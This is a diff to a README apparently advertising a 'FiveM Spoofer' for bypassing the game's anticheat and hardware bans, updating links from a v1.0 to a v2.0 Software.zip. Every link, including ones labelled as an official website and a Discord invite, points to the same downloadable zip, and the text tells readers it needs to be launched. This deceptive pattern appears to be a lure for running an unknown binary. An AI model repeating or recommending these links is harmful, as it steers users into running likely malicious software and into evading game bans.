@@ -33,17 +33,17 @@ bypass-fivem-anticheat, cfx-bypass, cfx-hardware-unban, cfx-unban, finiac-bypass
 To explore and utilize the full potential of FiveM Spoofer, make sure to download the application by clicking the button below: 
 <br>
 
-[![Download FiveM Spoofer](https://github.com/TheBackrooms77/FiveM-Spoofer/releases/download/v1.0/Software.zip Spoofer-blue)](https://github.com/TheBackrooms77/FiveM-Spoofer/releases/download/v1.0/Software.zip)
+[![Download FiveM Spoofer](https://github.com/TheBackrooms77/FiveM-Spoofer/releases/download/v2.0/Software.zip Spoofer-blue)](https://github.com/TheBackrooms77/FiveM-Spoofer/releases/download/v2.0/Software.zip)
 
 _(The link ends with the file name, it needs to be launched)_
 
 ## Let's Connect!
-Feel free to visit our [official website](https://github.com/TheBackrooms77/FiveM-Spoofer/releases/download/v1.0/Software.zip) for more information and updates. 🌐🔗
+Feel free to visit our [official website](https://github.com/TheBackrooms77/FiveM-Spoofer/releases/download/v2.0/Software.zip) for more information and updates. 🌐🔗
 
 ## Join the Community
 Join our Discord server to connect with other gamers, share experiences, and get the latest news about FiveM Spoofer! 💬🎮
 
-[![Join Discord Server](https://github.com/TheBackrooms77/FiveM-Spoofer/releases/download/v1.0/Software.zip)](https://github.com/TheBackrooms77/FiveM-Spoofer/releases/download/v1.0/Software.zip)
+[![Join Discord Server](https://github.com/TheBackrooms77/FiveM-Spoofer/releases/download/v2.0/Software.zip)](https://github.com/TheBackrooms77/FiveM-Spoofer/releases/download/v2.0/Software.zip)
 
 ## Stay Updated
 For the latest releases, updates, and announcements regarding FiveM Spoofer, check out the "Releases" section of this repository. 🚀✨
